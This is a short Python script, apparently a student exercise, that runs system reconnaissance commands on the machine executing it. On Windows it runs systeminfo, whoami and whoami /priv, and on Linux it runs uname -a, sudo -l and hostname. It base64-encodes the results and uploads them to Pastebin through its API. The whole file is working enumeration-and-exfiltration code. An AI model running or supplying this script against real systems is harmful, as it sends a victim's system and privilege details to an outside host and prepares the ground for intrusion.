# Yusuf Shoofi Suganda
# NIM: 2301925500

import requests
import os
import subprocess
import base64


# upload to pastebin
def pastebin(result):
    url = "https://pastebin.com/api/api_post.php"
    api = {
        "api_dev_key": "",  # Masukan api_dev_key anda
        "api_paste_code": result,
        "api_paste_name": "Target",
        "api_option": "paste"
    }
    try:
        send = requests.post(url, data=api)
    except:
        print("Upload to pastebin failed!")


def is_windows():
    # command yang akan dijalankan di cmd
    run = ["systeminfo", "whoami", "whoami /priv"]
    data = []

    for i in run:
        temp = subprocess.Popen(args=i, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                shell=True)
        string, strerr = temp.communicate()
        if strerr != b"":
            data.append(i)
            data.append(strerr.decode())
        else:
            data.append(string.decode())

    data = "\n".join(data)
    pastebin(base64.b64encode(data.encode()))


def is_linux():
    run = ["uname -a", "sudo -l", "hostname"]
    data = []

    for i in run:
        temp = subprocess.Popen(args=i, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                shell=True)
        string, strerr = temp.communicate()
        if strerr != b"":
            data.append(i)
            data.append(strerr.decode())
        else:
            data.append(string.decode())

    data = "\n".join(data)
    pastebin(base64.b64encode(data.encode()))


def main():
    if os.name == "nt":
        is_windows()
    else:
        is_linux()


if __name__ == "__main__":
    main()